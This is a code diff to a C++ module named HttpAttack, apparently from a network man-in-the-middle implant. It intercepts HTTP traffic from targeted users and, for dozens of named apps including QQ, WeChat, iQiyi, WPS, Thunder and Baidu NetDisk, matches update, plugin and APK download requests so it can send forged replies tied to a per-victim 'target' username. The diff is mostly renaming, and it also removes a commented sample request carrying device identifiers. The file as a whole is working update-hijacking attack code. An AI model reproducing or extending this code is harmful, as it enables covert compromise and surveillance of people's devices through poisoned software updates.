@@ -1,4 +1,5 @@
 #include "HttpAttack.h"
+#include "../Utils/Tools.h"
 #include "Toutiao.h"
 #include "WeixinAndroid.h"
 #include "PluginServer.h"
@@ -7,7 +8,7 @@
 #include "../Public.h"
 #include "QQAndroid.h"
 #include "QQVideoSSL.h"
-#include "InformerClient.h"
+#include "InformerInterface.h"
 #include "momo.h"
 #include "QQMusicAndroid.h"
 #include "ShuqiPlugin.h"
@@ -51,6 +52,7 @@
 #include "qitu.h"
 #include "peanutShell.h"
 
+
 int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url, const char* szdm, const char* httphdr,
 	const char* httpdata, LPHTTPPROXYPARAM lphttp) {
 
@@ -58,12 +60,12 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	int retlen = 0;
 
 	if (lphttp->saToClient.sin_addr.S_un.S_addr == 0x0100007f || strstr(lphttp->host, "127.0.0.1") ||
-		(lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIPAddr && gAttackMode != 3))
+		(lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIP && gAttackMode != 3))
 	{
 		return TRUE;
 	}
 
-	if (lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIPAddr)
+	if (lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIP)
 	{
 		if (gAttackMode == 3)
 		{
@@ -92,13 +94,13 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 		}
 		else if (QQVideoSSL::isTencentPcUpgrade(url, lphttp->host))
 		{
-			string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+			string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 			lstrcpyA(lphttp->username, username.c_str());
 			ret = QQVideoSSL::replyTencentPcUpgrade(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
 		}
 		else if (strstr((char*)url, "/fusion/3.0/plugin?"))
 		{
-			string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+			string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 			lstrcpyA(lphttp->username, username.c_str());
 			int retlen = IqiyiPlugin::replyIqiyiPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
 			if (retlen > 0)
@@ -114,7 +116,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (LeTVPlugin::isletvPlugin(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -126,7 +128,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (DuBa::isDuba(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -141,7 +143,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (TouTiao::isToutiaoUpdateConfig(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -152,7 +154,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (QQMusicAndroid::isQQMusicUpdatePacket(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -164,7 +166,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (MiaoPaiUpdate::isMiaoPai(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -177,7 +179,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQBrowserPlugin::isQQBrowserPlugin(url, szdm, httphdr, httpdata))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -192,7 +194,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (IqiyiPlugin::isIqiyi(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -207,7 +209,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (KugouPlugin::isKugouPlugin(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -219,7 +221,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (DouyuPlugin::isDouyu(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -233,7 +235,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (JingDongPlugin::isJingDong(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -246,7 +248,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (ShuqiPlugin::isShuqiHead(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -257,7 +259,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (ShuqiPlugin::isShuqiRequest(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -271,7 +273,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (WeixinAndroid::isWxAndroidUpdateConfig(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -283,7 +285,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQAndroid::isAndroidQQApkUpdate(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -294,7 +296,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (QQVideoSSL::isQQVideo(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -305,7 +307,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (WeixinAndroid::isWxAndroidRequestApk(url, szdm) || WeixinAndroid::isWxAndroidRequestWebApk(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -316,7 +318,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (Youku::isYoukuApk(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -328,7 +330,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQTencentNews::isQQNews(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -344,7 +346,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (NotepadPP::isNotepadExe(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -356,7 +358,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQAndroid::isQQNowPlugin(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -368,7 +370,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQAndroid::isQQPlugin(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -380,7 +382,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQAndroid::isQQNowMgrPlugin(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -390,7 +392,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (QQAndroid::isQQSecLibs(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -404,7 +406,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQPim::isQQPim(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -415,7 +417,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (ChangBaPlugin::isChangba(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -427,7 +429,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (Wgs2gcjPlugin::isWgs2gcj(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -438,7 +440,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (AmapHotfix::isAmapHotfix(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -449,7 +451,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (BaofengPllugin::isBaofengUpdate(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -465,7 +467,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (AlibabaProtect::isAliProtect(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -480,7 +482,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (ThunderUpdate::isThunder(url, szdm, httphdr))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -495,7 +497,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (WPSPlugin::isWpsPlugin(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -510,7 +512,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QQManager::isQQManager(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -525,7 +527,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (SogouExplorer::isSogouExplorer(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -541,7 +543,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (BaiduPromotion::isBaiduAd(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -555,7 +557,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (BrowserDownload::isBrowserDownload(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -570,7 +572,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (ZHWNL::isZhwnl(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -584,7 +586,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (CboxPlugin::isCboxUpdate(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -597,7 +599,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (LBSPos::isLBSPos(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -611,7 +613,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (Browser2345Android::isBrowser2345Android(url, szdm, httpdata))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -625,7 +627,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (PeanutShell::isPeanutShell(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -640,7 +642,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (QituAndroid::isQituAndroid(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -655,7 +657,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	// 	{
 	// 		return FALSE;
 	// 
-	// 		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr,szdm);
+	// 		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr,szdm);
 	// 
 	// 		lstrcpyA(lphttp->username, username.c_str());
 	// 
@@ -663,7 +665,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	// 	}
 	else if (MeiTuanPatch::isMeiTuan(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -676,7 +678,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (NetEaseNewsUpdate::isNeteaseNews(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -688,7 +690,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (Plugin2345::isPlugin2345(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -702,7 +704,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (QQmtt::isQQmttPlugin(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -716,7 +718,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (BaiduLocation::isBaiduLoc(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -730,7 +732,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 	}
 	else if (SunflowerUpdate::isSunflower(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -745,7 +747,7 @@ int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 	else if (BaiduNetDisk::isBaiduUpdateJson(url, szdm))
 	{
-		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
+		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
 
 		lstrcpyA(lphttp->username, username.c_str());
 
@@ -779,28 +781,26 @@ int HttpAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* sz
 		printf("HTTP send attack ok,host:%s,packet:%s\n", szdm, recvBuffer);
 	}
 
-	iRet = Public::WriteLogFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, resultlen, "http send attack response packet:");
+	iRet = Public::writeFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, resultlen, "http send attack response packet:");
 	return TRUE;
 }
 
 
-
-
-int HttpAttack::httpAttackProc(char* recvBuffer, int& iCounter, LPHTTPPROXYPARAM pstHttpProxyParam) {
+//return value: none zero,shutdown connection;zero,continue connection
+int HttpAttack::httpAttackProc(char* buf, int& iCounter, LPHTTPPROXYPARAM hpp) {
 
 	int iRet = 0;
-	char szout[1024];
 
 	char* httpdata = 0;
 	string httphdr = "";
 	string url = "";
 	string host = "";
 	int port = 0;
-	int type = 0;
-	iRet = HttpUtils::parseHttpHdr(recvBuffer, iCounter, type, httphdr, &httpdata, url, host, port);
+
+	iRet = HttpUtils::parseHttpHdr(buf, iCounter, httphdr, &httpdata, url, host, port);
 	if (iRet < 0)
 	{
-		if (pstHttpProxyParam->host[0] == 0)
+		if (hpp->host[0] == 0)
 		{
 			return TRUE;
 		}
@@ -810,43 +810,32 @@ int HttpAttack::httpAttackProc(char* recvBuffer, int& iCounter, LPHTTPPROXYPARAM
 	}
 	else if (iRet == 0)
 	{
-		iRet = AttackSplitPacket::splitPacket(recvBuffer, iCounter, pstHttpProxyParam, httphdr, &httpdata, url, host, port);
+		iRet = AttackSplitPacket::splitPacket(buf, iCounter, hpp, httphdr, &httpdata, url, host, port);
 		if (iRet <= 0)
 		{
-			Public::WriteLogFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, iCounter, "\r\nhttp splitPacket error:\r\n");
+			log("%s %d error:%d\r\n",__FUNCTION__,__LINE__,GetLastError());
 			return TRUE;
 		}
 		else {
-			lstrcpyA(pstHttpProxyParam->host, host.c_str());
+			lstrcpyA(hpp->host, host.c_str());
 		}
 	}
 	else
 	{
-		lstrcpyA(pstHttpProxyParam->host, host.c_str());
+		lstrcpyA(hpp->host, host.c_str());
 	}
 
-	if (*pstHttpProxyParam->host == 0)
+	if (*hpp->host == 0)
 	{
 		return TRUE;
 	}
-
-	// 	if (host.find("ganlai.722ka.cn") != -1 || 
-	// 		host.find("k30.com") != -1 || 
-	// 		host.find("https") != -1 || 
-	// 		host.find("f9.rr5568866.xyz:5678") != -1 ||	
-	// 		host.find("qixuanplay.com") != -1)
-	// 	{
-	// 		return TRUE;
-	// 	}
-
 
 	if (SSLPublic::isTargetHost(host) == FALSE)
 	{
 		return TRUE;
 	}
 
-	iRet = HttpAttack::httpAttackPacket((char*)recvBuffer, iCounter, url.c_str(), host.c_str(), httphdr.c_str(),
-		httpdata, pstHttpProxyParam);
+	iRet = HttpAttack::httpAttackPacket((char*)buf, iCounter, url.c_str(), host.c_str(), httphdr.c_str(),httpdata, hpp);
 	if (iRet)
 	{
 		return TRUE;
@@ -855,7 +844,3 @@ int HttpAttack::httpAttackProc(char* recvBuffer, int& iCounter, LPHTTPPROXYPARAM
 	return FALSE;
 }
 
-
-/*
-iface2.iqiyi.com/fusion/3.0/plugin?plugins=5594_2.3_&app_k=2080320204add8e266bfef28948d903c&app_v=9.7.6&platform_id=10&dev_os=4.4.4&dev_ua=Che1-CL10&net_sts=1&qyid=A000004F931A45&cupid_v=3.27.006&psp_uid=&psp_cki=&imei=3f2d48f32b2a847a906f02eb8ab4ea4b&aid=cab8462d329b3a4a&mac=84:db:ac:b6:ac:c8&scrn_scale=2&secure_p=GPhone&secure_v=1&core=5&api_v=7.5&profile=&unlog_sub=0&cust_count=&dev_hw=%7B%22platform_ver%22%3A19%2C%22scrn_size%22%3A4.590000152587891%2C%22gyro%22%3A1%2C%22mem%22%3A1910%2C%22cpu_core%22%3A4%2C%22cpu%22%3A%221209600%22%2C%22display_mem%22%3A%22%22%2C%22gpu%22%3A%22%22%7D&net_ip=&scrn_sts=0&scrn_res=720,1280&scrn_dpi=320&cupid_id=A000004F931A45&psp_vip=0&psp_status=1&app_t=0&province_id=2007&service_filter=&service_sort=&aqyid=A000004F931A45_cab8462d329b3a4a_84ZdbZacZb6ZacZc8&pps=0&pu=&cupid_uid=A000004F931A45&app_gv=&gps=,&lang=zh_CN&app_lm=cn&req_times=0&req_sn=1534320376335
-*/
